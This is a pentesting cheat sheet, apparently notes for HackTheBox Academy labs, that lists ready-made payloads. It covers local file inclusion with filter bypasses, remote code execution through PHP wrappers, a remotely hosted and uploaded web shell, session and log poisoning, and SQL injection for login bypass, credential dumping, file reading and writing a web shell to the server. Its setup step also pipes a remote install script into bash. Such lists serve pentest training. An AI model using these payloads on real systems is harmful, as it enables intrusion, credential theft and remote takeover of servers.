# 1. Introduction.

# 2.1. Installation de la machine.
- Installez un systeme de gestion de machine virtuelle comme [Virtulbox](https://www.virtualbox.org/wiki/Downloads).
- Installez la machine virtuelle [Kali-linux](https://www.kali.org/get-kali/#kali-virtual-machines).
- Une fois la machine démarré, lancez les commandes : `sudo wget https://github.com/ROYJohan08/RJI-HackTools/raw/main/Install.sh | bash`
- Ouvrez firefox et installez [Cookie-editor](https://addons.mozilla.org/fr/firefox/addon/cookie-editor/?utm_source=addons.mozilla.org&utm_medium=referral&utm_content=search)

## Adding dns.
Add on hosts with `sudo nano /etc/hosts` add to the format `IP DNS`.

[Enumeration](00-Enumeration.md)
[Exploit](01-Exploit.md)
[Usefull links](00-Link.md)

Others : 
```
sudo sh -c 'echo "SERVER_IP academy.htb" >> /etc/hosts'	Add DNS entry
for i in $(seq 1 1000); do echo $i >> ids.txt; done	Create Sequence Wordlist
curl http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded'	curl w/ P
```

## File inclusion.

Basic LFI :
```
/index.php?language=/etc/passwd
```
LFI with path traversal :
```
/index.php?language=../../../../etc/passwd
```
LFI with name prefix :
```
/index.php?language=/../../../etc/passwd
```
LFI with approved path
```
/index.php?language=./languages/../../../../etc/passwd
```
Bypass basic path traversal filter :
```
/index.php?language=....//....//....//....//etc/passwd
```
Bypass filters with URL encoding :
```
/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
```
Bypass appended extension with path truncation (obsolete) :
```
/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]
```
Bypass appended extension with null byte (obsolete) :
```
/index.php?language=../../../../etc/passwd%00
```
Read PHP with base64 filter :
```
/index.php?language=php://filter/read=convert.base64-encode/resource=config
```
RCE with data wrapper :
```
/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```
RCE with input wrapper :
```
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"
```
RCE with expect wrapper :
```
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```
Host web shell :
```
echo '<?php system($_GET["cmd"]); ?>' > shell.php && python3 -m http.server <LISTENING_PORT>
```
Include remote PHP web shell :
```
/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
```
Create malicious image :
```
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```
RCE with malicious uploaded image :
```
/index.php?language=./profile_images/shell.gif&cmd=id
```
Create malicious zip archive 'as jpg' :
```
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```
RCE with malicious uploaded zip :
```
/index.php?language=zip://shell.zip%23shell.php&cmd=id
```
Create malicious phar 'as jpg' :
```
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```
RCE with malicious uploaded phar :
```
/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```
Read PHP session parameters :
```
/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```
Poison PHP session with web shell :
```
/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```
RCE through poisoned PHP session :
```
/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
```
Poison server log :
```
curl -s "http://<SERVER_IP>:<PORT>/index.php" -A '<?php system($_GET["cmd"]); ?>'
```
RCE through poisoned PHP session :
```
/index.php?language=/var/log/apache2/access.log&cmd=id
```

## Injections SQL.
Basic Auth Bypass : 
```
admin' or '1'='1
```
Basic Auth Bypass With comments :
```
admin')-- -
```
Detect number of columns using order by :
```
' order by 1-- -
```
Detect number of columns using Union injection :
```
cn' UNION select 1,2,3-- -
```
Basic Union injection :
```
cn' UNION select 1,@@version,3,4-- -
```
Union injection for 4 columns :
```
UNION select username, 2, 3, 4 from passwords-- -
```
Fingerprint MySQL with query output :
```
SELECT @@version
```
Fingerprint MySQL with no output :
```
SELECT SLEEP(5)
```
Current database name :
```
cn' UNION select 1,database(),2,3-- -
```
List all databases :
```
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
```
List all tables in a specific database :
```
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```
List all columns in a specific table :
```
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```
Dump data from a table in another database :
```
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```
Find current user :
```
cn' UNION SELECT 1, user(), 3, 4-- -
```
Find if user has admin privileges :
```
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
```
Find if all user privileges :
```
cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```
Find which directories can be accessed through MySQL :
```
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```
Read local file :
```
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```
Write a string to a local file :
```
select 'file written successfully!' into outfile '/var/www/html/proof.txt'
```
Write a web shell into the base web directory :
```
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```
